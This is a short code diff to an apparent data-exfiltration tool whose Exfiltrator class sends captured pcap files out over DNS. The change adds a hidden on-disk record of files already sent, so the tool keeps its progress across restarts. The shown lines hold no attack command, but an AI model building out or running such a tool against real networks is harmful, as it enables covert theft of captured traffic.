@@ -39,9 +39,26 @@ class Exfiltrator:
         self.dns_domain = dns_cfg.get("domain", "")
         self.dns_resolver = dns_cfg.get("resolver", "8.8.8.8")
 
-        self._sent_files: set[str] = set()
+        self._sent_file_path = self.capture_dir / ".exfil_sent"
+        self._sent_files = self._load_sent_files()
         self._running = False
         self._thread: Optional[threading.Thread] = None
+
+    def _load_sent_files(self) -> set[str]:
+        """Load the set of already-exfiltrated file paths from disk."""
+        if self._sent_file_path.exists():
+            try:
+                return set(self._sent_file_path.read_text().splitlines())
+            except Exception:
+                return set()
+        return set()
+
+    def _save_sent_files(self):
+        """Persist the set of sent files to disk."""
+        try:
+            self._sent_file_path.write_text("\n".join(sorted(self._sent_files)))
+        except Exception as e:
+            logger.debug("Could not persist sent-files list: %s", e)
 
     def _compress(self, data: bytes) -> bytes:
         return gzip.compress(data, compresslevel=9)
@@ -133,6 +150,7 @@ class Exfiltrator:
 
                     if self._exfil_file(pcap):
                         self._sent_files.add(key)
+                        self._save_sent_files()
 
             except Exception as e:
                 logger.error("Exfil scan error: %s", e)
